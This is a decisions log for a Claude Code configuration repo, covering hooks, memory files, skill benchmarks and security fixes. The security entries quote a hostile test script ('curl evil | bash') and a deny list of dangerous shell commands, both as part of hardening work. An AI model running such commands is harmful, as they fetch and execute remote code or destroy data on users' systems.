# Architectural Decisions — Claude Code Config

> **Canonical decisions file (restored 2026-07-16).** This is the path `post_commit_memory.py`'s
> `find_decisions_file()` and `session_start.py` actually resolve — before this file existed,
> commits with an `arch:`/`decision:`/`security:`/`pattern:` prefix were silently dropped
> ("Decision detected but no decisions.md found"), and `session_start.py`'s decisions-context
> print was always empty. Content below through the "---" divider is migrated verbatim from
> the legacy `memory/decisions.md` (repo root) so no history is lost. New decisions append below.
> See `docs/memory-architecture.md` for the full memory-system map.

## Format
### [DATE] Decision Name
- **Problem:** what needed solving
- **Decision:** what was chosen
- **Rationale:** why this approach
- **Status:** active / superseded / revisited

---

### [2026-08-30] construct-measurement-gate: real blind benchmark found "diagnostic specialist, not evaluator" — v0.2 removes its own final Verdict step
- **Problem:** A fourth external prompt-template gap ("Construct-Measurement
  Integrity Auditor") was built as `construct-measurement-gate` v0.1 (5 steps
  ending in a self-issued Verdict: PASS/CALIBRATE/TRIANGULATE/REDEFINE/
  REPLACE). A first, self-run 4-case benchmark was scored WEAKENED/bordering-
  FALSIFIED by an independent skeptic — not for the gate, but for the claim
  "this benchmark justifies expansion" (self-picked textbook cases, imagined
  not run baseline, every degree of freedom held by one party).
- **Decision:** Ran a real blind holdout per the skeptic's own kill criteria
  and per a user-specified protocol: an independent curator agent (blind to
  the gate's existence) sourced 10 real, WebSearch-verified cases (3
  confirmed-failure / 3 clean / 2 deceptive-control / 2 ambiguous, 6
  non-textbook). Baseline (free-form strong expert audit) and Treatment
  (v0.1 exactly as specified) ran independently; blind adjudication scored
  both against sealed ground truth. Result: both hit sensitivity 3/3,
  specificity 3/3; Treatment was systematically stronger at H_REAL/H_MEASURE
  construction, independent-channel search, and discriminating-test design
  (10/10 explicit tests vs 4/10) — but lost the single highest-stakes case
  (a deceptive control, Urban Heat Island): its own "don't strengthen a claim
  while H_MEASURE is unruled-out by the data given" discipline produced a
  non-committal TRIANGULATE where free reasoning correctly reached PASS,
  independently reconstructing the real published discriminating mechanism.
  Full protocol, dataset, ground truth, and result: `benchmarks/
  construct-measurement-gate/run-2026-08-30-blind-holdout.md`. Formal Pass
  Criteria were not all met (no clear verdict-quality superiority) → EXPAND
  to a full 13-gate version rejected. The user explicitly declined the
  tempting narrow fix ("apply broad model knowledge when specific studies are
  named") as trading evidence discipline for passing one benchmark case.
  Shipped v0.2 instead: removes the gate's own final Verdict entirely,
  keeping only diagnostics (Steps 1-8) + advisory-only recommendations (Step
  9, never REPLACE/REDEFINE directly) + explicit handoff to a downstream
  adjudicator (`hypothesis-arbiter` / `boyko-scientific-consortium` /
  `skeptic` / a human) at Step 10.
- **Rationale:** The adjudicator's own words — "a combined workflow: R2's
  channel-hunting and test design, gated by R1's verdict calibration, would
  outperform either alone" — pointed directly at a role split, not a prompt
  patch. Fixing the Verdict step to pass this one case would have made the
  gate's evidence discipline dependent on model memory (whether it happens to
  recall the specific named studies), a strictly worse trade than admitting
  the module is a specialist. v0.2 architecture itself is NOT yet separately
  benchmarked — it is a response to this finding, not a confirmed
  improvement. Per "max one revision per cycle, then a new holdout or stop,"
  no new blind holdout was run immediately; next evidence source is real
  usage, not another synthetic benchmark on the same question.
- **Status:** active — `construct-measurement-gate` v0.2, `maturity: dogfooded`
  for the v0.1-as-evaluator finding (real benchmark exists and is cited),
  `described` for the v0.2-as-diagnostician architecture (not yet
  independently tested).

---

### [2026-08-30] Three external prompt-template gaps harvested into 4 skill files; negative-space-miner hardened through 3 adversarial audit cycles, then stopped by the Evaluator-Optimizer Guard cap
- **Problem:** User shared 3 external research-hypothesis-generation prompt
  templates ("Assumption Mutation Engine", "Adversarial Hypothesis Tournament",
  "Negative-Space Hypothesis Miner"). Per "Using Wheels First," compared each
  against the skill catalog before building anything new.
- **Decision:**
  - Patched `hypothesis-arbiter` — added a per-outcome next-action field to
    its existing Outcome map (Этап 2), closing the "Outcome Interpretation"
    gap found in the Adversarial Hypothesis Tournament template.
  - Patched `narrow-discovery-engines` — added a 15-category assumption
    checklist (Step 1a) and Criticality Ranking (Step 1b) to Engine 2,
    closing the "Assumption Taxonomy" gap found in the Assumption Mutation
    Engine template.
  - Created new skill `negative-space-miner` — mines EXTERNAL published null
    results/failed replications into competing Repair Hypotheses. The only
    one of the three gaps with no existing home in the catalog.
  - Extended `hd-mavp-router` with a new `negative_space` run_mode routing to
    the new skill (with an explicit carve-out from its "claim-decomposer
    always first" rule, since this mode starts with no claim yet).
  - Ran `negative-space-miner` on 3 independent real objects (ego depletion,
    gut-microbiome/obesity, minimum-wage employment effects) with real
    WebSearch each time, each verified by an independent context-asymmetric
    `Agent(skeptic)` audit (not self-graded). Each of the 3 audits found a
    real, distinct flaw; each was fixed with a named gate in the skill
    (7 gates total: Ruling Theory Trap, Rescue-unfalsifiability check,
    Exhaustion Completeness check, Full-row diagnosticity check,
    numeric-threshold requirement, mandatory field's-own-methodological-
    dispute search, Stratifier-confound check).
- **Rationale:** The 3rd audit verdict ("worse than a competent economist's
  20-minute read") revealed a real structural boundary, not a bug: the skill
  is reliable where the conflict is a standard type (measurement error,
  confounding, reverse causation — ego depletion, partly microbiome) but
  systematically weaker where a field's central dispute is about
  identification-strategy/method choice rather than a biological/behavioral
  mechanism (modern causal econometrics). Per this repo's own
  Evaluator-Optimizer Guard (root `CLAUDE.md`): 3 run→skeptic→fix cycles
  without a clean LGTM is the cap — escalate to the user instead of a silent
  4th cycle. User confirmed: stop here, the boundary is sufficiently mapped
  for the current version.
- **Status:** active — `negative-space-miner` v1.4.0, `hypothesis-arbiter` and
  `narrow-discovery-engines` patches both live. The mapped boundary
  (identification-strategy-dominated fields) is recorded in
  `negative-space-miner`'s own frontmatter and `skills/registry.yaml`
  evidence, not hidden — future use on that class of object should expect a
  weaker result and budget for extra manual review.

---

### [2026-07-17] Kept sec-auditor + security-guard separate; wired security-guard into review-squad's release gate instead
- **Problem:** Coherence audit flagged sec-auditor/security-guard as overlapping
  (identical `tools`/`model`/`skills:` config, both security-domain) and proposed
  merging them into one mode-based agent.
- **Checked first:** this exact merge was already done once (13→9 agents,
  security-guard merged into sec-auditor) and reverted the same day — see
  `[2026-03-31] 4 agents restored from _archived/` above. Rationale then: "all 4
  serve distinct purposes with no overlap."
- **Decision:** Did NOT redo the merge. Re-reading both files: config is
  identical but behavior isn't — sec-auditor is real-time (PII masking +
  injection blocking, already wired into review-squad), security-guard is a
  structured pre-release checklist (Sentry lookup, PASS/BLOCK verdict) that was
  invoked by no team at all despite `review-squad.md`'s own "When to Use" listing
  "Before production deploys" as a trigger nothing actually backed. Added a
  Release Gate stage to `review-squad.md` that invokes security-guard
  specifically for production releases, not every routine PR.
- **Rationale:** The 2026-03-31 "no overlap" framing undersells real config
  duplication, but the underlying distinction (real-time vs pre-release
  checklist) is genuine — a straight merge would have flattened it, repeating a
  change already tried and reverted without addressing why. Wiring the existing
  gap closed the actual problem (an unused agent, an unbacked trigger claim)
  without re-litigating a settled decision.
- **Status:** active

---

### [2026-04-04] Fix regex replacement in webhook_notify.py
- **Problem:** `_SECRET_PATTERN.sub(r"\1=[REDACTED]", summary)` raised `PatternError`
  on Python 3.13 — all alternations used non-capturing `(?:...)`, so `\1` was invalid.
- **Decision:** Changed to `_SECRET_PATTERN.sub("[REDACTED]", summary)` — replace full match.
- **Rationale:** Simpler and correct. The capture group was never needed; we want to replace
  the entire secret match, not a sub-group of it.
- **Status:** active

### [2026-04-04] Coverage gate: 38% → 45%, target next: 60%
- **Problem:** CI gated at 38% — honest but too low for "production-grade" claim.
- **Decision:** Added 168 tests across 5 zero-coverage hooks. Gate raised to 45%.
- **Rationale:** Risk-weighted approach — covered keyword_router, permission_policy,
  evidence_guard, security_verify, webhook_notify first (all HIGH-RISK, all were 0%).
- **Status:** active — next step: scripts/ coverage (doctor.py, weekly_review.py)

### [2026-04-04] Eval job: workflow_dispatch + schedule, continue-on-error
- **Problem:** Eval corpus existed (6 TCs) but was never run in CI — manual only.
- **Decision:** Added `eval` CI job triggered by `workflow_dispatch` and weekly cron
  (Monday 06:00 UTC). `continue-on-error: true` — eval is informational, not a gate.
- **Rationale:** LLM responses are non-deterministic and API calls cost money. Running
  on every push would waste budget and create flaky CI. Weekly + manual is the right cadence.
- **Status:** active

### [2026-03-31] v3.2.0: 5 new hook events (TaskCreated, TaskCompleted, InstructionsLoaded, Elicitation, ElicitationResult)
- **Problem:** TaskCreated/Completed events not hooked — no visibility into agent task lifecycle.
- **Decision:** Added task_audit.py, instructions_audit.py, elicitation_guard.py, subagent_verify.py.
- **Rationale:** Full 25/25 hook event coverage. Observability layer for agent quality.
- **Status:** active

### [2026-03-31] 4 agents restored from _archived/ (security-guard, scope-guard, fe-mentor, skill-suggester)
- **Problem:** Agent count dropped to 9 after cleanup — useful agents were archived too aggressively.
- **Decision:** Restored all 4 with `effort` field and `permissionMode: acceptEdits` for builder/tester.
- **Rationale:** All 4 serve distinct purposes with no overlap. Archiving them reduced coverage.
- **Status:** active — 13 agents + 3 teams

### [2026-03-30] v3.0.0: Split monolithic CLAUDE.md → modular 6-layer architecture
- **Problem:** Single CLAUDE.md grew to 3000+ tokens, loaded on every message.
- **Decision:** Layer 1 (CLAUDE.md, 500 tok, always) + Layer 2 (rules, 0 tok, on-demand)
  + Layer 3 (skills, triggered) + Layer 4 (agents, isolated) + Layer 5 (hooks, 0 tok runtime)
  + Layer 6 (MCP profiles, switchable).
- **Rationale:** Token economy: ~500 tokens/message vs 3000+. Hooks enforce policy
  deterministically without consuming context window.
- **Status:** active — core architecture

### [2026-03-30] Hooks enforce policy, not instructions
- **Problem:** CLAUDE.md documented Evidence Policy, TDD, PII rules — but nothing enforced them.
  Claude could ignore any instruction.
- **Decision:** Move enforcement to Python hooks (PreToolUse, PostToolUse, UserPromptSubmit).
  Hooks run 100% of the time, cannot be skipped by the model.
- **Rationale:** `[VERIFIED] vs [INFERRED]` distinction: hook execution is deterministic,
  prompt instructions are probabilistic. Hard guards belong in hooks.
- **Status:** active

### [2026-03-30] permission_policy: dangerous patterns checked BEFORE chain operators
- **Problem:** Design question — which check has priority: dangerous pattern or chain operator?
- **Decision:** Check DANGEROUS_PATTERNS first, CHAIN_OPERATORS second, SAFE_PREFIXES third.
- **Rationale:** A command with a dangerous pattern (`rm -rf`) is always denied regardless of
  chain operators. Chain operators only escalate to "ask" when no dangerous pattern is found.
  Deny > Ask > Allow is the correct security ordering.
- **Status:** active — verified by test_permission_policy.py::TestDecidePriority

### [2026-03-30] MCP CircuitBreaker: CLOSED/OPEN/HALF_OPEN with 60s recovery
- **Problem:** MCP server failures caused session hangs — no automatic recovery.
- **Decision:** CircuitBreaker with state machine: CLOSED (normal) → OPEN (3 failures) →
  HALF_OPEN (probe after 60s) → CLOSED (probe succeeds) or OPEN (probe fails).
- **Rationale:** Standard resilience pattern. 60s recovery window prevents thundering herd.
  mcp_circuit_breaker.py at 98% coverage — highest-coverage hook.
- **Status:** active

### [2026-07-16] Restored canonical `.claude/memory/decisions.md` (this file)
- **Problem:** External architectural audit + internal Codex audit both flagged that
  `find_decisions_file()` (post_commit_memory.py) and `session_start.py` resolve
  `.claude/memory/decisions.md`, which never existed — only the legacy `memory/decisions.md`
  (repo root) had real content, but nothing reads it. Result: every `arch:`/`decision:`/
  `security:`/`pattern:` commit since this drifted apart silently dropped its decision entry.
- **Decision:** Migrated the full historical content from `memory/decisions.md` into this file
  verbatim (everything above this entry) and added a DEPRECATED banner to the legacy file
  pointing here, matching the precedent already set for `activeContext.md`'s same split.
  Legacy file kept, not deleted — `find_file_upward` resolution for other callers wasn't
  independently re-audited in this pass.
- **Rationale:** Minimal, safe fix matching `docs/memory-architecture.md`'s own stated target
  ("one canonical memory root") without doing the riskier full retirement of `memory/` in the
  same pass. Restores the write and read path both hooks already expected.
- **Status:** superseded — the "riskier full retirement" this entry deferred was completed
  2026-09-04, see the entry below. `memory/decisions.md` and `memory/activeContext.md` no
  longer exist; this entry's historical content (migration rationale) stays accurate as a
  record of what happened at the time, only the "kept, not deleted" / "not independently
  re-audited" framing is now stale.

### [2026-09-04] Retired legacy root `memory/{activeContext,decisions}.md` (memory-retrieval-repair-tz.md PR-6b)
- **Problem:** the entry above deferred full retirement of the legacy repo-root `memory/`
  directory because `find_file_upward` resolution "wasn't independently re-audited." Left
  unaddressed, `docs/memory-architecture.md` and this file kept asserting retirement was
  still pending — a GitHub Codex bot review on PR #339 caught exactly this stale-claim risk
  ("every agent is required to read the canonical decisions file [and] will receive a false
  architectural state").
- **Decision:** did the re-audit this time: grepped every `hooks/*.py`/`scripts/*.py`
  reference to a bare (non-`.claude/`-prefixed) `memory/activeContext.md` or
  `memory/decisions.md` path — none found; `find_file_upward()`'s own implementation only
  ever checks the exact relative path it's given, and nothing in this repo passes it a bare
  `memory/...` path. `install.sh:794` does import `memory/templates/*.md` — that directory
  is real and load-bearing, kept untouched. Deleted only `memory/activeContext.md` and
  `memory/decisions.md`. Added `TestFindDecisionsFileResolution` (4 tests) exercising
  `find_decisions_file()`'s REAL resolution logic end-to-end (previously only mocked in
  existing tests) before deleting, not after.
- **Rationale:** `docs/memory-architecture.md`'s own stated precondition
  ("the legacy root `memory/` is retired once the `find_file_upward` resolution is confirmed
  to prefer `.claude/memory/`") was met and verified with tools, not assumed.
- **Status:** active

### [2026-07-17] SEC-01: removed pytest/npm test/npm run test/npm run lint from auto-allow
- **Problem:** External security audit found `hooks/permission_policy.py`'s `SAFE_BASH_PREFIXES`
  auto-approved `pytest`, `python -m pytest`, `npm test`, `npm run test`, `npm run lint` via
  `cmd_lower.startswith(prefix)`. Unlike the other safe prefixes (git introspection, ruff, mypy —
  none of which execute repository-authored code), these commands EXECUTE it: pytest imports
  `conftest.py`/fixtures/plugins from the working tree before running a single test; `npm test`/
  `npm run <script>` runs whatever arbitrary shell command `package.json`'s `scripts` section
  defines. A malicious `conftest.py` or a `"test": "curl evil | bash"` package.json script would
  execute with the user's privileges, with zero confirmation, the moment an agent ran "the tests"
  in an untrusted repository. The prefix match also collided on lookalike executable names
  (`pytest-malicious` starts with "pytest"). An existing test (`test_pytest_allowed`) explicitly
  asserted the old behavior as correct — this was a deliberate design choice (fewer prompts), not
  an oversight, but the threat-model gap for untrusted repos was real.
- **Decision:** Removed all 5 from `SAFE_BASH_PREFIXES`; they now require explicit "ask" like any
  other command. `ruff`/`mypy` remain auto-allowed (pure static analysis, no code execution).
  Did NOT implement the audit's full remediation roadmap (sandboxed test-runner profile,
  capability-scoped approval, exact-argv parsing) — that is a much larger engineering project;
  this fix closes the specific auto-allow bypass, not the general "should test runners ever be
  safe to auto-run" question.
- **Rationale:** The security cost (arbitrary code execution in untrusted repos, zero
  confirmation) outweighs the convenience benefit (fewer prompts) for a config whose whole
  premise is evidence-based trust, not convenience-first defaults. Matches the same precedent
  already set for `cat`/`head`/`tail`/`wc` reading sensitive paths (security audit 2026-07-07/
  07-12) — narrow the auto-allow surface to genuinely side-effect-free operations only.
- **Status:** active

### [2026-07-17] SEC-02: webhook DNS check fail-closed + pinned against rebinding TOCTOU
- **Problem:** External security audit found two related gaps in `hooks/webhook_notify.py`'s
  SSRF protection: (1) `_resolves_to_blocked_ip` returned `False` (not blocked) when
  `socket.getaddrinfo` raised `OSError`, treating "can't tell if it's safe" as "it's safe" —
  the wrong default specifically for an SSRF check; (2) the hostname was resolved ONCE at
  validation time (`get_webhook_url()`) but `urlopen()` then re-resolved the SAME hostname
  independently at connect time — a DNS-rebinding attacker could return a safe public IP for
  the validation check and a private/metadata IP for the real connection moments later.
- **Decision:** Replaced `_resolves_to_blocked_ip(hostname) -> bool` with
  `_resolve_safe_ip(hostname) -> str | None`, which fails CLOSED on resolution failure and
  returns the validated IP itself (not just a bool) so callers can pin the connection to
  it. `send_webhook()` now resolves the hostname once, immediately before connecting, and
  monkeypatches `socket.getaddrinfo` (scoped by try/finally, restored before the function
  returns) so any DNS lookup for that exact hostname during the connection returns the
  already-validated IP — closing the window between check and connect. `_ValidatingRedirectHandler`
  extends the same pinning to redirect targets via a shared `pins` dict.
- **Rationale:** Fail-closed is safe here specifically because `send_webhook` already treats
  every failure as a normal, silent outcome (fire-and-forget, all exceptions swallowed) — the
  cost of refusing to resolve is one missed Slack ping, not a broken workflow, unlike
  `input_guard.py`/`permission_policy.py` where fail-closed on the wrong thing would block a
  legitimate tool call. Chose a monkeypatched `getaddrinfo` pin over hand-rolled
  `http.client.HTTPConnection`/`HTTPSConnection` subclasses — same TOCTOU-closing effect,
  far less code, and TLS/SNI/certificate-hostname verification keeps working unmodified since
  only the low-level address resolution is intercepted, not the Host header or SNI hostname.
- **Status:** active

### [2026-07-18] SEC-03: permission_policy.py was wired to a hook event that never fires
- **Problem:** `hooks/permission_policy.py` was registered under the `PermissionRequest` event.
  Per Claude Code's own docs (verified via WebFetch against code.claude.com/docs/en/hooks and
  /en/permissions, not assumed), `PermissionRequest` fires only "when a permission dialog
  appears". `hooks/settings.json` has `"Bash(*)"` unconditionally in `permissions.allow` — a
  static rule that auto-approves every Bash command with no dialog ever shown. Since no dialog
  ever appears for Bash in this repo's own config, `PermissionRequest` never fired for a single
  Bash command, meaning the entire `decide()` logic — the SEC-01 pytest/npm-test "ask" fix
  *and* the whole `DANGEROUS_PATTERNS` deny list (`rm -rf`, `curl | bash`, `sudo`, `DROP TABLE`,
  `git push --force`, etc.) and the sensitive-path-read guard — was dead code for as long as
  `Bash(*)` has been in the allow list. Found while independently re-verifying two conflicting
  sub-agent claims about permission precedence (per `audit-verification-gate.md`: an agent's
  `[VERIFIED]` is only my `[INFERRED]` until checked directly) — neither agent's paraphrase was
  trusted; the docs were fetched and read verbatim before concluding anything.
- **Decision:** Moved the hook from `PermissionRequest` to `PreToolUse`/matcher `"Bash"` — the
  event the docs themselves name as the correct pattern ("add `Bash` to your allow list and
  register a PreToolUse hook that rejects those specific commands"). `main()` now emits
  `hookSpecificOutput.permissionDecision` via `utils.emit_permission_decision()` instead of a
  hand-built `PermissionRequest`/`decision.behavior` payload. Added `hook_main(fail_closed=True)`,
  matching the treatment already given to other deny-capable hooks (`input_guard.py`,
  `pre_commit_guard.py`) — this hook was previously called bare, with no timeout/crash
  protection at all. Synced `hooks/registry.yaml` metadata (`event`/`matcher`), removed
  `scripts/config_audit_scan.py`'s now-stale check that flagged the *absence* of a
  `PermissionRequest` registration as a safety gap (its presence there was the actual problem),
  and corrected two README claims ("~75% fewer prompts" via the dead mechanism) to describe
  what the hook actually does now.
- **Rationale:** `decide()`'s logic itself was never in question — only its wiring. `PreToolUse`
  fires unconditionally on every tool call, before permission rules are evaluated, and can
  override a matching allow rule via `permissionDecision`/exit-code-2, which is exactly the
  override capability this hook's threat model requires and `PermissionRequest` structurally
  cannot provide once a blanket allow rule exists.
- **Status:** active

### [2026-07-23] Boyko's Step-4 tie-break made maturity-aware

- **Context:** `skills/registry.yaml`'s `kind`/`maturity` taxonomy (added PR #215, `gate_kind_maturity`)
  was never actually consulted by `agents/navigator.md`'s routing logic -- Step 4's within-tier
  tie-break ordered candidates by dependency count, cost, `status: stable`, version, and name only.
  A merely `wired` or `described` skill could out-rank a `dogfooded`/`benchmarked` one purely on
  the weaker, unenforced `status: stable` signal. This was the last open item from this session's
  methodology-DEEPENING roadmap ("Boyko stage-aware resolver using kind/maturity, depends on
  benchmark data") -- unblocked once the B6 Strong Inference benchmark supplied real
  `dogfooded` evidence (`hypothesis-arbiter`) to actually exercise the ordering against.
- **Decision:** Inserted `maturity` as tie-breaker #3 (`benchmarked` > `dogfooded` > `wired` >
  `described`; a candidate missing the field ranks as `described`), positioned ahead of
  `status: stable` (now #4), after dependency-count/cost (#1-2).
- **Rationale:** `maturity` is gate-10-enforced and evidence-backed -- `dogfooded`/`benchmarked`
  require a cited `maturity_evidence` artifact (e.g. `benchmarks/strong-inference/run-2026-07-23-full.md`
  for `hypothesis-arbiter`) -- while `status` is an informal, self-reported label with no evidence
  requirement behind it. A stronger, audited signal should out-rank a weaker, unaudited one when
  both are available, so maturity is checked first.
- **Status:** active

### [2026-09-02] §8-first over VerificationOps: put the control plane under real load before instrumenting it further

- **Context:** Same-day comparison against an external Claude Code multi-agent orchestration
  research doc (see PR #317) found this repo already ahead on fresh-context verification, oracle
  hierarchy, and evidence markers, but genuinely behind on two things: formal delegation contracts
  (closed same day, `rules/delegation-contract.md`) and structured agent-execution telemetry
  (partially closed, `agent_lifecycle.py`'s "Declared Model" column). An external reviewer then
  proposed going further: a `verification_gap` metric (`claimed_success_rate - verified_success_rate`)
  and an empirical autonomy-calibration loop that would let measured reliability automatically
  adjust `autonomy-budget.md`'s Green/Yellow/Red/Black tiers.
- **Decision:** Do the §8 experimental-pack work NOW (scientific-discovery / hypothesis-arbiter /
  claim-pipeline — real hypotheses, real oracle-adequacy tests, real falsification runs).
  VerificationOps telemetry is deferred to an **instrumentation milestone**, not cancelled — it
  activates once real §8 runs produce actual PASS/FAIL/UNKNOWN outcomes worth aggregating, not on
  a calendar date or a round number. Two things are permanently rejected, not just deferred:
  (a) inferring `claimed_status` by regexing an agent's own prose ("done"/"passed"/"success") —
  this is validation theater by construction, a false operand dressed as a measurement, exactly
  the failure mode `rules/skeptic-triggers.md` already exists to catch; any future claim-status
  field must be an explicit structured value (`claim_status: success|partial|failure|unknown`) an
  agent or hook sets deliberately, never inferred from free text; (b) any mechanism where measured
  reliability *automatically* mutates the live autonomy tier — the owner's explicit solo-autonomy
  HARD RULE (`feedback_solo_autonomy_no_confirmations.md`) already burned once on a hook that
  silently added friction; a system that can decide, on its own, to tighten his autonomy the
  moment its own metrics look bad is the same failure shape in a smarter costume. Telemetry may
  only produce a `measurement -> recommendation -> human` loop, never `measurement -> policy
  mutation`.
- **Rationale:** The repo's own §7 stable packs (delegation, oracle machinery, falsification
  gates, CI/deployment) are past the point of obvious marginal returns — the open question is no
  longer "can one more verification mechanism be added" but "do the existing mechanisms actually
  catch failures on real, hard tasks." §8 scientific-hypothesis work is exactly the workload this
  whole architecture was built to be tested against (unclear ground truth, competing explanations,
  a real chance of a wrong estimand or a weak oracle) — it will surface whether the control plane
  works far faster than another synthetic infra PR would. Building a metrics layer before that
  workload exists risks measuring noise and calling it signal, which is the identical mistake the
  reviewer's own inflated confidence score (`0.96` with no dataset behind it) had just been called
  out for making one message earlier in the same conversation.
- **Status:** active — revisit VerificationOps once real §8 runs exist with actual disagreement
  cases (PASS/FAIL/UNKNOWN outcomes across multiple hypotheses, not a single run), per DEFAULT
  FOCUS BIAS in `activeContext.md`.

### [2026-09-02] Same-day corollary: RetroBench and Judge Calibration Lab deferred too, by the identical logic

- **Context:** Immediately after the §8-first decision above, the owner brought a third-party
  (GPT-authored) two-round critique of the HD-MAVP/APEX-style "ResearchOps" architecture for
  review. Round 1 proposed 20 new modules; round 2 self-corrected after being shown this repo's
  actual implementation (`docs/methodologies/HD-MAVP_REFERENCE.md`, `falsification-ladder.md`'s
  Independent Verification Strength Ladder/Cheapest Differentiating Test/Paraphrase-Sensitivity
  Probe, `null_results`/`parked`), narrowing to 4 real gaps: a verified Temporal Retrodiction
  Benchmark, a Judge Calibration Lab (with a genuinely good new metric, False Promotion Rate),
  a Morphological Hypothesis Generator + Mechanism Exclusion registry, and executing (not just
  documenting) cross-model disagreement checks. Both were rated (8/10, 8.7/10) and independently
  re-verified against actual repo files before accepting the ratings, not taken at face value.
- **Decision:** Do not build RetroBench or the Judge Calibration Lab now. Morphological
  Generator / Mechanism Exclusion are logged as a real, confirmed gap but also not built now —
  no active task currently exhibits the mode-collapse they'd fix. The one cheap action taken
  instead: log today's Buckholtz AVB K5 recheck (20 pairs, 2 independent evaluator runs, 95%
  reproducibility) as data point #1 toward an eventual judge-calibration dataset, in that
  project's own `pearl_registry/INDEX.md` — not a new skill, one record.
- **Rationale:** RetroBench and Judge Calibration are instruments for measuring whether the
  research pipeline works — the identical category as VerificationOps (an instrument for
  measuring whether the verification pipeline works), just aimed at a different pipeline stage.
  The same argument applies without modification: building the measuring instrument before there
  is real load to measure risks calibrating against noise, and this repo has direct, on-the-nose
  precedent for exactly this failure mode with historical-case benchmarks specifically
  (`null_results/20260715-sde-cc-fabricated-historical-corpus.md` — a 40-case "verified historical
  discovery" corpus was REJECT'd for zero real sources and a reproduced, unverified factual error).
  Round 2's own proposed fix (3 real forensically-verified cases before scaling to 10, then 30)
  independently converges on that same incident's own successful recovery pattern (a 3-case
  WebSearch/WebFetch-verified pilot, done before the 40-case version was ever attempted) — further
  confirming the incident is the right anchor, not an overcautious one.
- **What was NOT accepted from round 2, and why:** its proposed "NO GENERATION BEFORE
  NEGATIVE-MEMORY CHECK" invariant, framed as a router *prompt* instruction. This repo already
  has the stronger version: `null-results-pre-check` is a hook that fires deterministically on
  keyword match against `null_results/INDEX.md`, independent of whether any session's prompt
  remembers to ask for it — it fired correctly on this exact conversation, twice, unprompted,
  including catching the sde-cc precedent above before it could be silently re-attempted. A prompt
  instruction is strictly weaker than a hook for an invariant meant to hold every time; adopting
  the round-2 version would be a regression, not an upgrade.
- **Status:** active — revisit RetroBench/Judge-Calibration once the Buckholtz AVB line (or any
  other real §8 workload) has produced enough independent judge-disagreement data points that a
  dedicated calibration pass would use real signal instead of a single anecdote; revisit the
  Morphological Generator only if a real hypothesis-generation task shows observed mode collapse
  (narrow, repetitive mechanism coverage), not preemptively.

---

### [2026-09-03] SEC-02 follow-up: legacy unsafe `lib/security.py::send_webhook` removed; `webhook_notify.py::send_webhook` is now the sole, canonical implementation and matches its old call contract
- **Problem:** re-checking an external audit's "80 security Ruff diagnostics" claim (PR #328)
  surfaced a real, live SSRF-capable function: `hooks/lib/security.py` had its own
  `send_webhook(url, payload, timeout=5) -> bool`, with NO scheme/SSRF/DNS-rebinding validation,
  re-exported through `hooks/utils.py`'s backward-compatible facade (whose own docstring promises
  `from utils import X` keeps working for consumers outside this repo). Confirmed via repo-wide
  grep: zero in-repo callers. The real, hardened implementation lives in `webhook_notify.py`
  (SEC-02 above: DNS-rebinding pin, redirect re-validation) — the unsafe original was simply never
  removed after the hardened one was built.
- **Decision:** deleted the unsafe duplicate outright (PR #328); re-pointed the facade at
  `webhook_notify.send_webhook` via delegation, not a rewritten copy (PR #329). A GitHub Codex bot
  review then caught, correctly, that delegation alone didn't preserve the OLD contract: the
  deleted function took `(url, payload, timeout=5) -> bool`, `webhook_notify`'s own version took
  only `(url, payload) -> None`. Fixed by extending `webhook_notify.send_webhook` itself to accept
  the optional `timeout` and return `bool` — the correct fix location, since it has exactly one
  internal caller (`main()`) that ignores the return value and never passes a timeout, so nothing
  else needed to change.
- **Rationale:** object identity (`utils.send_webhook is webhook_notify.send_webhook`) proves the
  reference resolves, not that the CONTRACT (signature + return semantics) matches what old
  callers expect — a distinct verification step, now captured as its own regression test
  (`test_facade_send_webhook_honors_the_old_call_contract` in `tests/test_utils_facade.py`) rather
  than relying on the identity check alone.
- **Status:** active. `hooks/lib/security.py` no longer defines any webhook-sending function;
  `hooks/webhook_notify.py::send_webhook` is the only implementation and is the facade's target.

---

### [2026-09-03] External audit response session: 4 Codex-bot findings, 3 real + 1 hallucinated — pattern worth naming
- **Problem:** while independently re-verifying 4 items an earlier pass had wrongly dismissed
  from a 7.2/10 external repo audit (unused noqa, security Ruff diagnostics, cyclomatic
  complexity, registry provenance), all 4 turned out to be accurate once measured with the
  correct tool invocation (`--extend-select` vs `--select`, properly scoped `ruff check`). Fixing
  the confirmed real ones (noqa cleanup, dead unsafe `send_webhook`, a `reliability_vector.py`
  xfailed/xpassed visibility gap) then went through 4 rounds of GitHub's own Codex bot review
  across PRs #327-#330, on top of this session's own `reviewer`/`sec-auditor` agents.
- **What Codex found, and what happened to each:**
  1. `hooks/utils.py` facade dropped `send_webhook`'s export entirely (P1) — REAL, missed before
     merging PR #328 because only CI status was checked, not PR review comments. Fixed in PR #329.
  2. The facade's replacement function had a different signature/return type (P1) — REAL, a
     second-order miss: object-identity checks don't prove contract compatibility. Fixed in the
     same PR.
  3. A direct write to `activeContext.md`/`commits-*.md` claimed a hash that was "not an ancestor"
     of some referenced commit (P1) — NOT REAL: the cited commit hash does not exist anywhere in
     this repo's history (`git log --all` found nothing), and the actual ancestry check
     (`git merge-base --is-ancestor`) contradicted the claim. Dismissed with this note as the
     record, not silently ignored.
  4. `reliability_vector.py`'s new `crashed` detection could be defeated by a coexisting xfailed
     match, masking a real pytest setup/collection error (P2) — REAL, reproduced directly with a
     live `pytest` run (a raising fixture alongside an unrelated xfail) before being accepted, not
     trusted from the bot's claim alone. Fixed in PR #330.
- **Rationale for the naming:** 3 of 4 automated-bot findings were genuine bugs this session's own
  review passes had missed; the pattern is strong enough to change process, not just fix the
  instances. `audit-verification-gate.md`'s "agent's [VERIFIED] = your [INFERRED]" discipline
  applied correctly here caught the one hallucinated finding (a fabricated commit hash) instead of
  either blindly accepting it or dismissively ignoring the whole batch because one item was wrong.
- **Process gap found and fixed the same night:** running a `reviewer`/`sec-auditor` agent against
  the shared working directory (`D:\Claude-cod-top-2026`) while continuing to `git checkout` other
  branches in that same directory corrupted two review passes mid-flight — the agent's tree moved
  out from under it. Fixed by using `git worktree add --detach <path> <commit>` to give concurrent
  reviews an isolated checkout, leaving the main working directory free to keep switching branches.
- **Status:** active. Check PR review comments (not just CI status) before every merge going
  forward — this is now a standing practice for this repo's own review process, not a one-off.
